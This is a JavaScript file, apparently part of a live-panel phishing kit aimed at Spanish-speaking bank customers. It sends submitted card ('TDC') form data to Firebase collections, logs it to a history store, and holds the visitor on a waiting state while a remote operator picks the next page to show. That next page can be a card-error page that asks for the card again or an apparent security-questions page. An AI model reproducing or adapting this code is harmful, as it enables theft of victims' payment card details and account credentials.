"use strict";

(function initTdcFirebase() {
  var tdcWatcher = null;

  function getCurrentTdcState() {
    return window.location.pathname.indexOf("tdc_err.html") !== -1 ? "error" : "ok";
  }

  function ready(callback) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", callback, { once: true });
      return;
    }
    callback();
  }

  function updateHistoryEntry(db, usuario, tdcData) {
    return db
      .collection("redireccion")
      .doc(usuario)
      .get()
      .then(function (snapshot) {
        var currentData = snapshot.exists ? snapshot.data() || {} : {};
        var payload = Object.assign(
          {
            usuario: usuario,
            timestamp: currentData.timestamp || new Date().toISOString(),
          },
          currentData,
          tdcData
        );

        return db
          .collection("datosHistorial")
          .doc(usuario)
          .set(payload, { merge: true });
      })
      .catch(function (error) {
        console.error("Error actualizando historial TDC:", error);
      });
  }

  function attachTdcWatcher(userRef) {
    if (tdcWatcher) {
      tdcWatcher();
      tdcWatcher = null;
    }

    tdcWatcher = userRef.onSnapshot(
      function (docSnapshot) {
        if (!docSnapshot.exists) {
          return;
        }

        var userData = docSnapshot.data() || {};
        var page = userData.page;

        if (page === 99) {
          window.location.href = "pregseg.html";
          return;
        }

        if (typeof page !== "number" || page <= 0) {
          return;
        }

        if (tdcWatcher) {
          tdcWatcher();
          tdcWatcher = null;
        }

        var route =
          window.appConfig &&
          window.appConfig.routes &&
          window.appConfig.routes[page]
            ? window.appConfig.routes[page]
            : null;

        if (route && route.url) {
          window.location.href = route.url;
          return;
        }

        window.location.href = "page" + page + ".html";
      },
      function () {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
          window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
        }
      }
    );
  }

  function setWaitingState(userRef, stateValue) {
    return userRef.set(
      {
        page: 0,
        tdcEstado: stateValue,
        tdcEsperandoPanel: true,
        tdcUltimaPagina: window.location.pathname.indexOf("tdc_err.html") !== -1 ? "tdc_err" : "tdc",
        tdcActualizadoEn: new Date().toISOString()
      },
      { merge: true }
    );
  }

  ready(function () {
    var db = window.db;
    var usuario = localStorage.getItem("usuarioActual");
    var currentState = getCurrentTdcState();

    if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
      var waitRef = db.collection("redireccion").doc(usuario);
      setWaitingState(waitRef, "error").then(function () {
        attachTdcWatcher(waitRef);
      });
    }

    document.addEventListener("tdc:mit", function (event) {
      var db = window.db;
      if (!db || typeof firebase === "undefined") {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
          window.tdcUi.showError("Firebase no esta disponible.");
        }
        return;
      }

      var usuario = localStorage.getItem("usuarioActual");
      if (!usuario) {
        window.location.href = "index.html";
        return;
      }

      var payload = event.detail || (window.tdcUi ? window.tdcUi.getPayload() : null);
      if (!payload) {
        if (window.tdcUi) {
          window.tdcUi.setLoading(false);
        }
        return;
      }

      var userRef = db.collection("redireccion").doc(usuario);
      var stateValue = getCurrentTdcState();
      payload.tdcEstado = stateValue;
      payload.page = 0;
      payload.tdcEsperandoPanel = true;
      payload.tdcUltimaPagina = stateValue === "error" ? "tdc_err" : "tdc";
      payload.tdcActualizadoEn = new Date().toISOString();

      userRef
        .set(payload, { merge: true })
        .then(function () {
          attachTdcWatcher(userRef);
          return updateHistoryEntry(db, usuario, payload);
        })
        .catch(function () {
          if (window.tdcUi) {
            window.tdcUi.setLoading(false);
            window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
          }
        });
    });
  });
})();
